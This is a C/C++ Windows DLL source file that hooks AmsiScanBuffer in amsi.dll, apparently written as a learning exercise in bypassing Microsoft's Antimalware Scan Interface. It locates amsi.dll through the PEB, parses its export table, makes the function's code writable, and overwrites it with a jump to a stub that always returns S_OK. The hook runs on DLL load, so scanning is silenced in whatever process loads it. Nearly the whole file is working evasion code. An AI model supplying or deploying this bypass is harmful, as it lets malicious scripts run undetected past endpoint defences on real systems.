// dllmain.cpp : Defines the entry point for the DLL application.
/*
This is a EAT hook for AmsiScanBuffer(). I have seen many implmentations of this using powershell byte patching,
but wanted to try function hooking instead. Hooking the EAT was a bigger pain than I thought, and using this article
I was able to figure it out: https://www.codereversing.com/archives/598
I essentialy re-wrote most of it in straight C, and this was a great learning experince. I also learned powershell does not 
import Amsi.dll straight off the bat, but loads is dynamically later on.
*/
#pragma
#define _CRT_SECURE_NO_WARNINGS

#include "pch.h"
#include <stdio.h>
#include <atlstr.h>
#include <amsi.h>


VOID debugError( LPWSTR message) {
    OutputDebugString(message);
    WCHAR outputToDebug[1024];
    swprintf(outputToDebug, 1024, L"[!] GetLastError() = %d", GetLastError());
    OutputDebugStringW(outputToDebug);
}

/*
HRESULT AmsiScanBuffer(
  [in]           HAMSICONTEXT amsiContext,
  [in]           PVOID        buffer,
  [in]           ULONG        length,
  [in]           LPCWSTR      contentName,
  [in, optional] HAMSISESSION amsiSession,
  [out]          AMSI_RESULT  *result
);
*/
typedef HRESULT (WINAPI *PAmsiScanBuffer)(
    __in HAMSICONTEXT amsiContext,
    __in           PVOID        buffer,
    __in           ULONG        length,
    __in           LPCWSTR      contentName,
    __in_opt HAMSISESSION amsiSession,
    __out          AMSI_RESULT* result);

PAmsiScanBuffer OriginalAmsiScanBuffer = NULL;

HRESULT hookedAmsiScanBuffer(
    __in HAMSICONTEXT amsiContext,
    __in           PVOID        buffer,
    __in           ULONG        length,
    __in           LPCWSTR      contentName,
    __in_opt HAMSISESSION amsiSession,
    __out          AMSI_RESULT* result) {

    OutputDebugStringW(L"[!] AmsiScanBuffer was called!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
    //HRESULT res = OriginalAmsiScanBuffer(amsiContext,buffer,length,contentName,amsiSession,result);
    
  
    return S_OK;
}

HMODULE returnModuleHandle(PWSTR libName) {
    HMODULE addrToLibrary = NULL;
#ifdef _WIN64
    PPEB pPEB = (PPEB)__readgsqword(0x60);
#elif __WIN32
    PPEB pPEB = (PPEB)__readfsdword(0x30);
#endif
    PPEB_LDR_DATA pldrData = pPEB->Ldr;
    PLIST_ENTRY lHead = &(pldrData->InMemoryOrderModuleList);
    PLIST_ENTRY lStop = &(pldrData->InMemoryOrderModuleList);
    OutputDebugStringW(L"[+] Starting to enumerate loaded modules!");
    while (lHead->Flink != lStop) {
        PMY_LDR_DATA_TABLE_ENTRY data = (PMY_LDR_DATA_TABLE_ENTRY)((LPBYTE)lHead - sizeof(LIST_ENTRY));
        //OutputDebugStringW((PWSTR)data->BaseDllName.Buffer);
        if ((PWSTR)data->BaseDllName.Buffer == NULL) {
            lHead = lHead->Flink;
            continue;
        }

        else if (0 == _wcsicmp((PWSTR)data->BaseDllName.Buffer, libName)) {
            //wprintf(L"[+] Found %s !, addr = 0x%p", libName, (PBYTE)data->DllBase);
            WCHAR outputToDebug[1024];
            // Print the module name and handle value.
            swprintf(outputToDebug, 1024, L"[+]\tFound %s at address 0x%p\n", libName, (HMODULE)data->DllBase);
            OutputDebugStringW(outputToDebug);
            addrToLibrary = (HMODULE)data->DllBase;
            break;
        }
        lHead = lHead->Flink;

    }
    return addrToLibrary;
}


void CreateJumpBytes(const void* destinationAddress, unsigned char jumpBytes[12]) {
    //mov rcx, 0xcccccccccccccccc
    //jmp rcx (0xFF, 0xE1)
    
    unsigned char tempJumpBytes[12] = {
        0x48, 0xB9, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
        0xFF, 0xE1
    }; 

    
    // Copy the temporary jump bytes to the provided array
    memcpy(jumpBytes, tempJumpBytes, sizeof(tempJumpBytes));

    //mov rax, addr of dest
    //jmp rax (0xff e0)
    // Replace placeholder value with the actual hook address
    uintptr_t address = (uintptr_t)destinationAddress;
    memcpy(&jumpBytes[2], &address, sizeof(uintptr_t));
    

}

DWORD startHook() {

    WCHAR myChar[] = { L"amsi.dll" };
    MODULEINFO modInfo = { 0 };
    HMODULE hMod = returnModuleHandle(myChar);

    if (!hMod) {
        OutputDebugStringW(L"[-] Error with getModuleHandle()");
        return ERROR;
    }
    OutputDebugStringW(L"[!] Starting to parse the PE!");
    GetModuleInformation(GetCurrentProcess(), hMod, &modInfo, sizeof(modInfo));
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)modInfo.lpBaseOfDll; // Getting DOS_HEADER
    PIMAGE_NT_HEADERS pImgNT = (PIMAGE_NT_HEADERS)((LPBYTE)pDos + pDos->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOpt = (PIMAGE_OPTIONAL_HEADER) & (pImgNT->OptionalHeader);
    if (0 == pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size) {
        OutputDebugStringW(L"[-] No export directory found");
        return -1;
    }
    PIMAGE_EXPORT_DIRECTORY pImport = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)pDos + pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PIMAGE_EXPORT_DIRECTORY copy = pImport;

    DWORD* names = (DWORD*)((LPBYTE)pDos + pImport->AddressOfNames);
    DWORD* functions = (DWORD*)((LPBYTE)pDos + pImport->AddressOfFunctions);
    WORD* ordinal = (WORD*)((LPBYTE)pDos + pImport->AddressOfNameOrdinals);
    PDWORD funcAddress = NULL;

    PDWORD pRelativeOffset = NULL;
    OutputDebugStringW(L"[+] Starting to loop through the address of Names");

    for (DWORD i = 0; i < copy->NumberOfNames; i++) {
        const char* name = (const char*)((LPBYTE)pDos + names[i]);
        if (0 == stricmp("AmsiScanBuffer", name)) {
            OutputDebugStringW(L"[+] Found AmsiScanBuffer() !");
            //funcAddress = (DWORD_PTR)((PDWORD)pDos + functions[ordinal[i]]); //0x2c80 Old:(FARPROC)((LPBYTE)pDos + functions[ordinal[i]]);
            pRelativeOffset = &functions[ordinal[i]]; // We found the desired function eatEntryRva
            WCHAR outputToDebug[1024];
            swprintf(outputToDebug, 1024, L"[+]\tFound AmsiScanBuffer at address 0x%p , it's VA is 0x%p\n", (*pRelativeOffset + (PDWORD)modInfo.lpBaseOfDll), (void*)functions[ordinal[i]]);
            OutputDebugStringW(outputToDebug);
            break;
        }
    
    }
    if (NULL == *pRelativeOffset) {
        OutputDebugStringW(L"[!] Could not find AmsiScanBuffer");
        return -1;
    }
   
    OriginalAmsiScanBuffer = (PAmsiScanBuffer)((PDWORD)modInfo.lpBaseOfDll + *pRelativeOffset); //check this later

    //=========================================================================================================
    unsigned char jump[12];
    CreateJumpBytes(hookedAmsiScanBuffer,jump);

    //Should have found AmsiScanBuffer by now
    PDWORD allocAddress = (PDWORD)modInfo.lpBaseOfDll + modInfo.SizeOfImage;
    void* allocatedAddress = NULL;

    size_t ALLOC_ALIGNMENT = 0x10000;
    do {
        allocatedAddress = (void*)VirtualAlloc((void*)allocAddress, sizeof(jump), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        allocAddress += ALLOC_ALIGNMENT;
    } while (allocatedAddress == NULL);
    if (!allocatedAddress) {
        OutputDebugString(L"[-] Failed VirtualAlloc()");
        WCHAR outputToDebug[1024];
        swprintf(outputToDebug, 1024, L"[!] GetLastError() = %d", GetLastError());
        OutputDebugStringW(outputToDebug);
    }
    void* jumpStub = allocatedAddress;
    memcpy(jumpStub,jump,sizeof(jump)); // copy the address 

    OutputDebugStringW(L"[+] Modifying premissions of function");
    
    DWORD oldPremissions = 0;
   // if (!VirtualProtect((LPVOID)(pRelativeOffset), sizeof(jump), PAGE_READWRITE, &oldPremissions)) {
    if (!VirtualProtect((LPVOID)((uintptr_t)modInfo.lpBaseOfDll + *pRelativeOffset), sizeof(jump), PAGE_EXECUTE_READWRITE, &oldPremissions)) {
        OutputDebugString(L"[-] Failed VirtualProtect()");
        WCHAR outputToDebug[1024];
        swprintf(outputToDebug, 1024, L"[!] GetLastError() = %d", GetLastError());
        OutputDebugStringW(outputToDebug);
    }
    OutputDebugStringW(L"[+] Modified premissions of AmsiScanBuffer() section");

    memcpy((LPVOID)((uintptr_t)modInfo.lpBaseOfDll + *pRelativeOffset), jumpStub, sizeof(jump));
    //*pRelativeOffset = (PDWORD)jumpStub - (PDWORD)modInfo.lpBaseOfDll ;
   // *(LPVOID*)funcAddress = (LPVOID)((PDWORD)hookedAmsiScanBuffer - (PDWORD)pDos); // hopefully this changes the address of AmsiScanBuffer to my hookedFunction *(LPVOID*)funcAddress = (LPVOID)hookedAmsiScanBuffer;
    //if (!VirtualProtect((LPVOID)(pRelativeOffset), sizeof(jump), oldPremissions, &oldPremissions)) {
    if (!VirtualProtect((LPVOID)((uintptr_t)modInfo.lpBaseOfDll + *pRelativeOffset), sizeof(jump), oldPremissions, &oldPremissions)) {
        OutputDebugString(L"[-] Failed to restore premissions of VirtualProtect");
        WCHAR outputToDebug[1024];
        swprintf(outputToDebug, 1024, L"[!] GetLastError() = %d", GetLastError());
        OutputDebugStringW(outputToDebug);

    }
    
    else {
       
        WCHAR outputToDebug[1024];
        swprintf(outputToDebug, 1024, L"[+] Wrote to 0x%p", ((uintptr_t)modInfo.lpBaseOfDll + *pRelativeOffset));
        OutputDebugStringW(outputToDebug);
        OutputDebugString(L"[++] Sucesfully restored the premissions of virtual protect, exiting program");
    }


    return S_OK;
}

//======================================================================

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxW(NULL,L"TestBox",L"Hello World!",MB_OK);
        startHook();
      
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

